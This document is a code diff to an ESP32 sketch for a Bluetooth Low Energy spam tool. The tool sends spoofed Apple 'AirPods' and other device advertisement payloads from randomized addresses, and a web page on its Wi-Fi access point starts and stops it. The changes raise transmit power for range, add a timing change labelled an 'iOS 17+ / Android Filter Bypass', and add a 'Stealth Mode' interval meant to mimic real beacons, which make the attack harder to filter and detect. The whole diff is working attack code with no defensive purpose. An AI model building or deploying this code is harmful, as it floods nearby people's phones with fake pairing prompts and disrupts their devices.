@@ -2,23 +2,28 @@
 #include <WebServer.h>
 #include <NimBLEDevice.h>
 #include "host/ble_hs.h"
+#include <Adafruit_NeoPixel.h> 
 
-// Access Point Credentials
+const int BUTTON_PIN = 0; 
+const int RGB_LED_PIN = 48; 
+
+Adafruit_NeoPixel strip(1, RGB_LED_PIN, NEO_GRB + NEO_KHZ800);
+
 const char* ssid = "BLE_Spam_AP";
 const char* password = "password123"; 
 
 WebServer server(80);
-
 NimBLEAdvertising *pAdvertising;
 
 int attack_state = 0; 
 int device_choice = 0;
 int device_index = 0;
 int selectedPacket = 30; // Default: Random Attack
-NimBLEUUID device_uuid("00003082-0000-1000-9000-00805f9b34fb");
 
-uint32_t delayMilliseconds = 1000;
+// iOS 17+ / Android Filter Bypass: 4-second persistence delay
+uint32_t delayMilliseconds = 4000;
 
+// Device Payloads
 const uint8_t DEVICES[][31] = {
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x02, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
   {0x1e, 0xff, 0x4c, 0x00, 0x07, 0x19, 0x07, 0x0e, 0x20, 0x75, 0xaa, 0x30, 0x01, 0x00, 0x00, 0x45, 0x12, 0x12, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00},
@@ -96,6 +101,8 @@ void handleStop() {
 void setup() {
   Serial.begin(115200);
 
+  randomSeed(esp_random());
+
   Serial.println("\nStarting AP...");
   WiFi.softAP(ssid, password);
   
@@ -109,7 +116,15 @@ void setup() {
   server.begin();
   Serial.println("Web Server Started.");
 
+  strip.begin();
+  strip.setBrightness(1); 
+  strip.clear();
+  strip.show(); 
+
   NimBLEDevice::init("AirPods");
+  
+  // Maximize TX Power (+9 dBm) for extended operational range
+  NimBLEDevice::setPower(ESP_PWR_LVL_P9);
   
   NimBLEServer *pServer = NimBLEDevice::createServer();
   pAdvertising = pServer->getAdvertising();
@@ -162,9 +177,13 @@ void Setup_New_Phone(); void Transfer_Number(); void TV_Color_Balance(); void Ap
 void Random_Attack(); void Extended_Attack(); void Flipper_Zero();
 
 void loop() {
+  
   server.handleClient();
 
   if (attack_state == 1) {
+    strip.setPixelColor(0, strip.Color(0, 255, 0));
+    strip.show();
+
     uint8_t dummy_addr[6] = {0};
     for (int i = 0; i < 6; i++) {
       dummy_addr[i] = random(256);
@@ -179,17 +198,25 @@ void loop() {
     NimBLEAdvertisementData oAdvertisementData = getAdvertismentData();
     pAdvertising->setAdvertisementData(oAdvertisementData);
 
-    pAdvertising->setMinInterval(0x20);
-    pAdvertising->setMaxInterval(0x20);
+    // Stealth Mode Configuration: 0x140 mimics real device beacon timing
+    pAdvertising->setMinInterval(0x140);
+    pAdvertising->setMaxInterval(0x140);
     
     pAdvertising->start();
     
     unsigned long start_time = millis();
     while (millis() - start_time < delayMilliseconds) {
       server.handleClient(); 
-      if (attack_state == 0) break;
+      if (attack_state == 0) {
+        strip.clear();
+        strip.show();
+        break;
+      }
       delay(10);
     }
+  } else {
+    strip.clear();
+    strip.show();
   }
 }
 
